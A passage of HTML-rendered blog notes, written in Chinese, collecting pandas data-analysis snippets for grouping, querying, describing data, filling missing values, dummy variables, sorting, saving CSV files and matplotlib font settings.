class="string">'电商'</span>).sum())</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过 positionName 的长度进行分组，并计算不同长度岗位名称的薪资均值</span></span><br><span class="line">df.set_index(<span class="string">"positionName"</span>).groupby(len)[<span class="string">'salary'</span>].mean()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">where 等同于写在df[]中的条件</span></span><br><span class="line"><span class="string">query 函数我类似sql语言中的where 相当于在df中写sql</span></span><br><span class="line"><span class="string">filter 类似sql中groupby后的having</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># where</span></span><br><span class="line">work_index.where(work_index[<span class="string">'地市'</span>]==<span class="string">'厦门市'</span>)</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">work_index.query(<span class="string">'地市=="厦门市"'</span>)</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">work_index[work_index[<span class="string">'地市'</span>]==<span class="string">'厦门市'</span>]</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">work_index.loc[work_index[<span class="string">'地市'</span>]==<span class="string">'厦门市'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取平均工资小于 30000 的行政区的全部数据</span></span><br><span class="line">df.groupby(<span class="string">'district'</span>).filter(<span class="keyword">lambda</span> x: x[<span class="string">'salary'</span>].mean() &lt; <span class="number">30000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过匿名函数分组 根据 createTime 列，计算每天不同 行政区 新增的岗位数量</span></span><br><span class="line">pd.DataFrame(df.groupby([df.createTime.apply(<span class="keyword">lambda</span> x:x.day)])[</span><br><span class="line">             <span class="string">'district'</span>].value_counts()).rename_axis([<span class="string">"发布日"</span>, <span class="string">"行政区"</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 df2 计算获得奖牌最多的运动员</span></span><br><span class="line">df2[<span class="string">'运动员'</span>].value_counts().sort_values(ascending=<span class="literal">False</span>).head(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#等价于</span></span><br><span class="line">df.groupby(<span class="string">'运动员'</span>).count()[<span class="string">'奖牌类型'</span>].sort_values(ascending=<span class="literal">False</span>).head(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看各国在不同项目上的获奖牌情况</span></span><br><span class="line"><span class="comment"># 这里括号内要写df[]</span></span><br><span class="line">df2[<span class="string">'总奖牌数'</span>].groupby([df2[<span class="string">'国家'</span>],df2[<span class="string">'运动类别'</span>]]).count().to_frame()</span><br><span class="line"></span><br><span class="line">df2.groupby([<span class="string">'国家'</span>,<span class="string">'运动类别'</span>]).count()[<span class="string">'总奖牌数'</span>].to_frame()</span><br><span class="line">pd.pivot_table(df2,values = [<span class="string">'奖牌类型'</span>],index = [<span class="string">'国家'</span>,<span class="string">'运动类别'</span>],aggfunc = <span class="string">'count'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按照列计算平均值</span></span><br><span class="line">df.mean(axis=<span class="string">'columns'</span>)</span><br><span class="line">df.mean(axis=<span class="number">1</span>) <span class="comment">#不是0，1是算每列的均值然后然后合并为一行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myfunc</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x.max()-x.mean()</span><br><span class="line"></span><br><span class="line">df.groupby(<span class="string">'district'</span>).agg(最低工资=(<span class="string">'salary'</span>, <span class="string">'min'</span>), 最高工资=(</span><br><span class="line">    <span class="string">'salary'</span>, <span class="string">'max'</span>), 平均工资=(<span class="string">'salary'</span>, <span class="string">'mean'</span>), 最大值与均值差值=(<span class="string">'salary'</span>, myfunc)).rename_axis([<span class="string">"行政区"</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 总分、高端人才得分、办学层次得分的最大最小值、中位数、均值</span></span><br><span class="line">df.agg(&#123;</span><br><span class="line">        <span class="string">"总分"</span>: [<span class="string">"min"</span>, <span class="string">"max"</span>, <span class="string">"median"</span>, <span class="string">"mean"</span>],</span><br><span class="line">        <span class="string">"高端人才得分"</span>: [<span class="string">"min"</span>, <span class="string">"max"</span>, <span class="string">"median"</span>, <span class="string">"mean"</span>],</span><br><span class="line">        <span class="string">"办学层次得分"</span>:[<span class="string">"min"</span>, <span class="string">"max"</span>, <span class="string">"median"</span>, <span class="string">"mean"</span>]&#125;)</span><br></pre></td></tr></table></figure><ul><li>查看数据信息</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看数据行列数</span></span><br><span class="line">df.shape</span><br><span class="line"><span class="comment"># 查看数据量</span></span><br><span class="line">df.size</span><br><span class="line"><span class="comment"># 查看 数值型 列的统计信息，计数、均值什么的</span></span><br><span class="line">df.describe()</span><br><span class="line"><span class="comment"># 查看 离散型 列的统计信息，计数、频率什么</span></span><br><span class="line">df.describe(include=[<span class="string">'O'</span>])</span><br><span class="line"><span class="comment"># 查看 全部 列的统计信息</span></span><br><span class="line">df.describe(include=<span class="string">'all'</span>)</span><br><span class="line"><span class="comment"># 去除重复的</span></span><br><span class="line">df[<span class="string">'a'</span>].unique()</span><br></pre></td></tr></table></figure><ul><li>查看统计数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看数据行列数</span></span><br><span class="line">df.shape</span><br><span class="line"><span class="comment"># 查看数据量</span></span><br><span class="line">df.size</span><br><span class="line"><span class="comment"># 查看 数值型 列的统计信息，计数、均值什么的</span></span><br><span class="line">df.describe()</span><br><span class="line"><span class="comment"># 查看 离散型 列的统计信息，计数、频率什么</span></span><br><span class="line">df.describe(include=[<span class="string">'O'</span>])</span><br><span class="line"><span class="comment"># 查看 全部 列的统计信息</span></span><br><span class="line">df.describe(include=<span class="string">'all'</span>)</span><br><span class="line"><span class="comment"># 计算 总分、高端人才得分、办学层次得分的最大最小值、中位数、均值</span></span><br><span class="line">df.agg(&#123;</span><br><span class="line">        <span class="string">"总分"</span>: [<span class="string">"min"</span>, <span class="string">"max"</span>, <span class="string">"median"</span>, <span class="string">"mean"</span>],</span><br><span class="line">        <span class="string">"高端人才得分"</span>: [<span class="string">"min"</span>, <span class="string">"max"</span>, <span class="string">"median"</span>, <span class="string">"mean"</span>],</span><br><span class="line">        <span class="string">"办学层次得分"</span>:[<span class="string">"min"</span>, <span class="string">"max"</span>, <span class="string">"median"</span>, <span class="string">"mean"</span>]&#125;)</span><br></pre></td></tr></table></figure><ul><li>查询</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询</span></span><br><span class="line">df.query(<span class="string">'金牌数+银牌数 &gt; 15'</span>)</span><br><span class="line">df_01.loc[df_01[<span class="string">'行业（按行业大类）'</span>].isin([<span class="string">'工业'</span>,<span class="string">'建筑业'</span>])]</span><br><span class="line">df_01.loc[(df_01[<span class="string">'行业（按行业大类）'</span>]==<span class="string">'工业'</span>)|(df_01[<span class="string">'行业（按行业大类）'</span>]==<span class="string">'建筑业'</span>)]</span><br><span class="line">df_01[df_01[<span class="string">'行业（按行业大类）'</span>].str.contains(<span class="string">'工业|建筑业'</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取全部列名中以 “数” 结尾的列</span></span><br><span class="line">df.loc[:, df.columns.str.endswith(<span class="string">'数'</span>)]</span><br><span class="line"><span class="comment"># 提取第1，2，3，4列</span></span><br><span class="line">df.iloc[:,<span class="number">0</span>:<span class="number">4</span>] </span><br><span class="line">df.iloc[:,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</span><br></pre></td></tr></table></figure><ul><li>查询类型</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df4.select_dtypes(include=[<span class="string">'int'</span>,<span class="string">'float64'</span>])</span><br><span class="line">df4.select_dtypes(exclude=[<span class="string">'int'</span>,<span class="string">'float64'</span>])</span><br></pre></td></tr></table></figure><ul><li>数据展开</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果行A和行C存在[a,b,c]这样的列表，我们可以用</span></span><br><span class="line">df5.explode([<span class="string">'A'</span>,<span class="string">'C'</span>])</span><br></pre></td></tr></table></figure><ul><li>数据累加</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df[list(<span class="string">'ABCD'</span>)].cumsum()</span><br><span class="line">df[list(<span class="string">'ABCD'</span>)].cumsum(axis = <span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li>按时间进行筛选</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">一般来说可以把datetime作为索引，比较方便我们进行筛选操作</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 将DateTime转成日期格式</span></span><br><span class="line">df[<span class="string">'DateTime'</span>] = pd.to_datetime(df[<span class="string">'DateTime'</span>])</span><br><span class="line"><span class="comment"># 将日期设为index</span></span><br><span class="line">df = df.set_index(<span class="string">'DateTime'</span>)</span><br><span class="line"><span class="comment"># 筛选从2019年3月1号到2019年3月10号整十天的数据</span></span><br><span class="line">df1 = df[<span class="string">'2019-03-01'</span>:<span class="string">'2019-03-10'</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">如果我们不想或者不好将datetime设置为索引，则可以使用如下方法</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 设置开始时间</span></span><br><span class="line">from_date = df[<span class="string">'DATA_DATE'</span>]&gt;=<span class="string">'2021-01-01'</span></span><br><span class="line"><span class="comment"># 设置结束时间</span></span><br><span class="line">to_date = df[<span class="string">'DATA_DATE'</span>]&lt;=<span class="string">'2021-03-31'</span></span><br><span class="line"><span class="comment"># 筛选数据时间段</span></span><br><span class="line">df = df[from_date&amp;to_date]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算日期加减：</span></span><br><span class="line">beg = end - pd.Timedelta(days=<span class="number">6</span>)</span><br></pre></td></tr></table></figure><ul><li>排序问题</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame(&#123;<span class="string">'A'</span>:[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>],<span class="string">'B'</span>:[<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>]&#125;)</span><br><span class="line"><span class="comment"># 先按着A列的值升序，再按着B的顺序降序</span></span><br><span class="line">df.sort_values([<span class="string">'A'</span>,<span class="string">'B'</span>],ascending=[<span class="literal">True</span>,<span class="literal">False</span>])</span><br></pre></td></tr></table></figure><ul><li>对df进行自定义排序</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">数据量小的情况</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">'A'</span>:[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>],<span class="string">'B'</span>:[<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>]&#125;)</span><br><span class="line"><span class="comment"># 将索引0和索引3的顺序对调</span></span><br><span class="line">indx = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="comment"># 如果index过长,可以通过.index获取</span></span><br><span class="line">df.index</span><br><span class="line"><span class="comment"># 使用reindex实现</span></span><br><span class="line">df.reindex(indx)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">数据量大的情况</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#df[1:3] = df[3:1]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># index 索引重排序</span></span><br><span class="line">frame.swaplevel(<span class="string">'key1'</span>, <span class="string">'key2'</span>)</span><br><span class="line"><span class="comment"># 对多个索引排序，按照名称</span></span><br><span class="line">frame.sort_index(level=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 按照索引值排序</span></span><br><span class="line">frame.sort_index()</span><br></pre></td></tr></table></figure><h2><span id="保存文件">保存文件</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不保存索引</span></span><br><span class="line">data.to_csv(<span class="string">"out.csv"</span>,encoding = <span class="string">'utf_8_sig'</span>,index = <span class="literal">False</span>)</span><br><span class="line"><span class="comment"># 保存指定列</span></span><br><span class="line">data.to_csv(<span class="string">"out.csv"</span>,columns=[<span class="string">'positionName'</span>,<span class="string">'salary'</span>])</span><br><span class="line"><span class="comment"># 小数点</span></span><br><span class="line">mar.to_csv(<span class="string">"2-1.csv"</span>, index=<span class="literal">False</span>, float_format=<span class="string">'%.3f'</span>)</span><br></pre></td></tr></table></figure><h2><span id="tricks">Tricks</span></h2><ul><li>异常值分析</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先看数据，后面na_values后期填写</span></span><br><span class="line">df = pd.read_csv(<span class="string">'xx.csv'</span>,na_values=[])</span><br><span class="line"><span class="comment"># 每个col去看它的unique()值是否有非法字符，如果有就添加到na_values中</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> df.columns:</span><br><span class="line">  print(df[c].unique())</span><br><span class="line"><span class="comment"># 使用head和info查看数据 数值型的数据</span></span><br><span class="line">df.head()</span><br><span class="line">df.info()</span><br><span class="line"><span class="comment"># 如果发现数值数据却是object类型，则转为int/float</span></span><br><span class="line">df.a = df.a.astype(<span class="string">'int'</span>)</span><br><span class="line"><span class="comment"># 如果提示错误，则可以从错误提示中找到非法字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果是需要 条件替换的时候</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">    mean = df[~(df[<span class="string">'v_'</span>+str(i)]==<span class="number">0</span>)][<span class="string">'v_'</span>+str(i)].mean()</span><br><span class="line">    indx = df[df[<span class="string">'v_'</span>+str(i)]==<span class="number">0</span>].index.tolist()</span><br><span class="line">    df.loc[indx,<span class="string">'v_'</span>+str(i)] = mean</span><br><span class="line">    <span class="comment"># 写成这样不行 因为取不到引用</span></span><br><span class="line">    df[df[<span class="string">'v_'</span>+str(i)]==<span class="number">0</span>][<span class="string">'v_'</span>+str(i)] = mean</span><br><span class="line">    <span class="comment">#使用loc可以取 但是[]不行</span></span><br><span class="line">    print(df[~(df[<span class="string">'v_'</span>+str(i)]==<span class="number">0</span>)].shape)</span><br></pre></td></tr></table></figure><ul><li>数据分析&amp;处理</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># isnull() is an alias for isna </span></span><br><span class="line"><span class="comment"># 计算缺失值</span></span><br><span class="line">df.isna().sum().sum()</span><br><span class="line"><span class="comment"># 每列有多少缺失值</span></span><br><span class="line">df.isnull().sum()</span><br><span class="line"><span class="comment"># 查看缺失值</span></span><br><span class="line">df[df.isnull().T.any() == <span class="literal">True</span>]</span><br><span class="line"><span class="comment"># 将评价人数列的缺失值，用整列的均值进行填充mean mode median</span></span><br><span class="line">df[<span class="string">'评价人数'</span>] = df[<span class="string">'评价人数'</span>].fillna(df[<span class="string">'评价人数'</span>].mean())</span><br><span class="line"><span class="comment"># 现在将评分列的缺失值，替换为上一个电影的评分</span></span><br><span class="line">df[<span class="string">'评分'</span>] = df[<span class="string">'评分'</span>].fillna(axis=<span class="number">0</span>,method=<span class="string">'ffill'</span>)</span><br><span class="line"><span class="comment"># 将评价人数列的缺失值，用上下数字的均值进行填充</span></span><br><span class="line">df[<span class="string">'评价人数'</span>] = df[<span class="string">'评价人数'</span>].fillna(df[<span class="string">'评价人数'</span>].interpolate())</span><br><span class="line"><span class="comment"># 在填充 “语言” 列的缺失值，要求根据 “国家/地区” 列的值进行填充</span></span><br><span class="line">df[<span class="string">'语言'</span>]=df.groupby(<span class="string">'国家/地区'</span>).语言.bfill()</span><br><span class="line"><span class="comment"># 查找重复值</span></span><br><span class="line">df[df.duplicated()]</span><br><span class="line"><span class="comment"># 查找指定列的重复值</span></span><br><span class="line">df[df.duplicated([<span class="string">'片名'</span>])]</span><br><span class="line"><span class="comment"># 删除全部的重复值</span></span><br><span class="line">df = df.drop_duplicates()</span><br><span class="line"><span class="comment"># 删除全部的重复值，但保留最后一次出现的值first/last/false</span></span><br><span class="line">df = df.drop_duplicates(keep = <span class="string">'last'</span>)</span><br><span class="line"><span class="comment"># 计算各省市出现的次数</span></span><br><span class="line">df.省市.value_counts()</span><br><span class="line"></span><br><span class="line"><span class="comment"># fillna 传字典</span></span><br><span class="line">pretreat=pretreat.fillna(&#123;<span class="string">'v_0'</span>:df_mean.v_0,</span><br><span class="line">          <span class="string">'v_1'</span>:df_mean.v_1,</span><br><span class="line">          <span class="string">'v_2'</span>:df_mean.v_2,</span><br><span class="line">          <span class="string">'v_3'</span>:df_mean.v_3,</span><br><span class="line">          <span class="string">'v_4'</span>:df_mean.v_4,</span><br><span class="line">          <span class="string">'v_5'</span>:df_mean.v_5,</span><br><span class="line">          <span class="string">'v_6'</span>:df_mean.v_6,</span><br><span class="line">          <span class="string">'v_7'</span>:df_mean.v_7,</span><br><span class="line">           <span class="string">'v_8'</span>:df_mean.v_8,</span><br><span class="line">          <span class="string">'v_9'</span>:df_mean.v_9,</span><br><span class="line">          <span class="string">'v_10'</span>:df_mean.v_10,</span><br><span class="line">          <span class="string">'v_11'</span>:df_mean.v_11,</span><br><span class="line">          <span class="string">'v_12'</span>:df_mean.v_12,</span><br><span class="line">          <span class="string">'v_13'</span>:df_mean.v_13,</span><br><span class="line">          <span class="string">'v_14'</span>:df_mean.v_14</span><br><span class="line">          &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">dropna: axis=1删除列，axis=0删除行</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 删除整行缺失的数据，剩余缺失数据按0值进行填充</span></span><br><span class="line">df2 = df2.dropna(how=<span class="string">'all'</span>).fillna(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 删除某列为空的行</span></span><br><span class="line">df_initial.dropna(axis = <span class="number">0</span>, subset = [<span class="string">'客户ID'</span>], inplace = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><ul><li>哑变量操作</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">哑变量操作</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">cate = df.columns[df.dtypes == <span class="string">"object"</span>].tolist() </span><br><span class="line"><span class="comment"># 或者自己指定想要成为哑变量的列</span></span><br><span class="line">cate = [<span class="string">'col1'</span>,<span class="string">'col2'</span>]</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cate:</span><br><span class="line">    df = pd.concat([df,pd.get_dummies(df[c],prefix=str(c))],axis=<span class="number">1</span>)</span><br><span class="line">    df.drop(c,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 解决int不能哑变量问题，一行solution</span></span><br><span class="line">pd.get_dummies(df,columns=[<span class="string">'用电类别'</span>,<span class="string">'用电类别'</span>,<span class="string">'年'</span>,<span class="string">'月'</span>]).info()</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">data[[<span class="string">'holiday'</span>,<span class="string">'month'</span>,<span class="string">'dayofweek'</span>]] = data[[<span class="string">'holiday'</span>,<span class="string">'month'</span>,<span class="string">'dayofweek'</span>]].astype(<span class="string">'object'</span>)</span><br><span class="line">data = pd.get_dummies(data)</span><br></pre></td></tr></table></figure><ul><li>统计空值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用apply实现</span></span><br><span class="line">df1 = pd.DataFrame(&#123;<span class="string">'A'</span>:[<span class="string">'A'</span>,<span class="string">'B'</span>,np.nan,np.nan],<span class="string">'B'</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,np.nan]&#125;)</span><br><span class="line">df1.apply(<span class="keyword">lambda</span> x:x.size - x.count())</span><br><span class="line"><span class="comment"># 使用isna、isnull实现</span></span><br><span class="line">df1.isna().sum() <span class="comment">#isna()返回的是个bool类型的矩阵，进行加和运算True默认为1，False默认为0，因此可以通过sum()函数来统计</span></span><br><span class="line"><span class="comment"># 统计每个空值的比例</span></span><br><span class="line">df1.isna().mean() <span class="comment"># mean() 相当于 True的个数/sum()的个数</span></span><br></pre></td></tr></table></figure><ul><li>计算最近的数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过abs来计算距离，然后通过sort_values来算最小的数</span></span><br><span class="line">df.val.apply(<span class="keyword">lambda</span> x:abs(x<span class="number">-1</span>)).sort_values()</span><br></pre></td></tr></table></figure><h2><span id="matplotlib">matplotlib</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fig,axis = plt.subplots(figsize=(<span class="number">10</span>,<span class="number">8</span>))</span><br></pre></td></tr></table></figure><h2><span id="tips">Tips</span></h2><h3><span id="屏蔽提醒">屏蔽提醒</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">'ignore'</span>)</span><br></pre></td></tr></table></figure><h3><span id="显示中文">显示中文</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># win设置中文</span></span><br><span class="line">plt.rcParams[<span class="string">'font.sans-serif'</span>]=[<span class="string">'SimHei'</span>] <span class="comment">#用来正常显示中文标签</span></span><br><span class="line">plt.rcParams[<span class="string">'axes.unicode_minus'</span>] = <span class="literal">False</span> <span class="comment">#用来正常显示负号</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mac设置中文</span></span><br><span class="line">plt.rcParams[<span class="string">'font.family'</span>] = <span class="string">'Heiti TC'</span><span class="comment">#用来正常显示中文标签</span></span><br><span class="line">plt.rcParams[<span class="string">'axes.unicode_minus'</span>] = <span class="literal">False</span> <span class="comment">#用来正常显示负号</span></span><br></pre></td></tr></table></figure><h3><span id="关于iloc和选择赋值失败问题">关于iloc和[]选择赋值失败问题</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="string">'2018-07'</span>][<span class="string">'a'</span>] 取出数字，不能赋值</span><br><span class="line">df.loc[<span class="string">'2018-07'</span>][<span class="string">'a'</span>]</span><br><span class="line">df.iloc[<span class="number">10</span>,<span class="number">1</span>]</span><br><span class="line">df.iloc[<span class="number">1</span>][<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">df.iloc[<span class="number">-31</span>:][<span class="string">'DailyElectricity'</span>]=<span class="number">0</span></span><br><span class="line">和</span><br><span class="line">df[<span class="number">-31</span>:][<span class="string">'DailyElectricity'</span>]=<span class="number">0</span></span><br><span class="line"><span class="string">'''均不能改变原df</span></span><br><span class="line"><span class="string">因为他们仅仅是取出来的值，而不是引用'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 给一个Series赋值另外一个Series需要reset_index() （保证index相同）</span></span><br></pre></td></tr></table></figure><ul><li>Jupyter</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">np.add? # 显示帮助</span><br><span class="line">np.add?? # 显示源代码</span><br><span class="line"><span class="comment"># fsting用法 python&gt;=3.6</span></span><br><span class="line">number = <span class="number">7</span></span><br><span class="line"><span class="string">f'My lucky number is <span class="subst">&#123;number&#125;</span>'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pandas </category>
